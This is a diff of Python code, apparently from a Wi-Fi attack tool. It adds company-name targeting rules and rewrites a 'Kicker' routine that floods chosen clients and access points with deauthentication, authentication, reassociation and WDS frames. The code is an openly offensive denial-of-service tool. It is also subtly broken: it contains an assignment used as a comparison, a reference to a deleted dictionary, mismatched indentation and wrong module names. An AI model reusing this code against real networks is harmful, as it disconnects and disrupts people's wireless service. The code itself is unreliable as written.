@@ -116,6 +116,10 @@ class Rule:
 	    self.rule = rule
 		anymatch = re.compile('any',re.IGNORECASE)
 		for key in rule.keys():
+			# Note there could be a bug here if it doesn't get named the same in client obj.
+			if key == "company":
+				#Build a greedy, case-ignoring regex to match off of
+				self.companymatch = re.compile(rule[key]+".*",re.IGNORECASE)
 			if anymatch.match(rule[key]):
 			    self.any = True
 			if key == "kickmethod":
@@ -130,7 +134,20 @@ class Rule:
 				# If it says any in the rule, realize that and drop it
 			    if any:
 					result = True
-				elif isinstance(self.rule[key],type.ListType):    #Detect Lists
+				# Company Name Match
+				if key == "company":
+					# If it's a list of companies
+					if isinstance(self.rule[key],type.ListType):
+						for item in rule['company']:
+							# Do any items in the list match our object?
+							if self.companymatch.match(item):
+								result = True
+								break
+					elif self.companymatch.match(obj_attributes[key]):
+						result = True
+
+				# Detect Lists
+				elif isinstance(self.rule[key],type.ListType):
 					result = obj_attributes[key] in self.rule[key]
 				elif obj_attributes[key] == self.rule[key]:
 					result = True
@@ -295,7 +312,7 @@ class Kicker:
     def __init__(self, ctx):
         self.lorconCtx = ctx
         self.engine = Gen80211.packetGenerator()
-
+				
     # We're going to need to adjust targets to be matched to attack
     def makeMagic(self, targets, pnap = 0):
         """
@@ -318,65 +335,36 @@ class Kicker:
 				kickmethod = obj.kickmethod
 				
 				#set the vars that act as the parameters to the deauthengine
-				
-				#we will see about static assignment above this for loop to save speed
-				kick = {
-							0:packetQue.extend(self.engine.deauthPacketEngine())
-							1:packetQue.extend(self.engine.deauthPacketEngine())
-							2:packetQue.extend(self.engine.deauthPacketEngine())
-							3:packetQue.extend(self.engine.deauthPacketEngine())
-							4:packetQue.extend(self.engine.deauthPacketEngine())
-				}
-				
+				# This is kinda a hack job.
+				channel = ap.channel
+				client_mac = obj.mac
+				bssid = ap.bssid
+
+				# If it's not a list, make it one
+				if isinstance(kickmethod,types.IntType):
+					kickmethod = [kickmethod]
+				# Well, looks like we got us a cowboy
+				if kickmethod == 0:
+					kickmethod = [1,2,3,4]
+				# Kick according to attacks in list
+				if 1 in kickmethod:
+					packetQue.extend(self.engine.deauthPacketEngine(True,client_mac,bssid,bssid,channel))
+				if 2 in kickmethod:
+					packetQue.extend(self.engine.authPacketEngine(True,client_mac,bssid,bssid,channel))
+				if 3 in kickmethod:
+					packetQue.extend(self.engine.reassPacketEngine(True,client_mac,bssid,bssid,channel))
+				if 4 in kickmethod:
+					packetQue.extend(self.engine.wdsPacketEngine(True,bssid,client_mac,bssid,channel))
 				#pew pew pew! Fire deauth packets!
-				kick[kickmethod]
-				
+				if kickmethod = 0:
+					while kickmethod != 4:
+						kickmethod = kickmethod + 1
+						kick[kickmethod] 
+				else:
+					kick[kickmethod]
+					
 			elif obj.type == "accessPoint": # I Disagree with this camelcase
 				pass # currently unimplemented.  Will hold autoimmune attacks
-				
-				
-""" #OLD SHIZ
-        for bssid in targets:
-            for client in targets[bssid][1]:
-                 if client in attacks.keys():
-                    attacklist = attacks[client].keys()
-                 else:
-                    print "bad looping"
-                    pdb.set_trace()
-                    continue
-                 if '0' in attacklist:
-                    # make all attacks run
-                    attacklist = ['1','2','3','4']
-                 if '1' in attacklist:
-                    packetQue.extend(
-                    self.engine.deauthPacketEngine(
-                            targets[bssid][0]["allow"],
-                            client, bssid, bssid,
-                            targets[bssid][0]["channel"]
-                            ))
-                 elif '2' in attacklist:
-                    packetQue.extend(
-                    self.engine.authPacketEngine(
-                            targets[bssid][0]["allow"],
-                            client, bssid, bssid,
-                            targets[bssid][0]["channel"]
-                            ))
-                 elif '3' in attacklist:
-                    packetQue.extend(
-                    self.engine.reassPacketEngine(
-                            targets[bssid][0]["allow"],
-                            client, bssid, bssid,
-                            targets[bssid][0]["channel"]
-                            ))
-                 elif '4' in attacklist:
-                    packetQue.extend(
-                    self.engine.wdsPacketEngine(
-                            targets[bssid][0]["allow"],
-                            bssid, client, bssid,
-                            targets[bssid][0]["channel"]
-                            ))
-                    
-""" #End old Shiz
 
         numPackets = len(packetQue)
         message.printMessage(
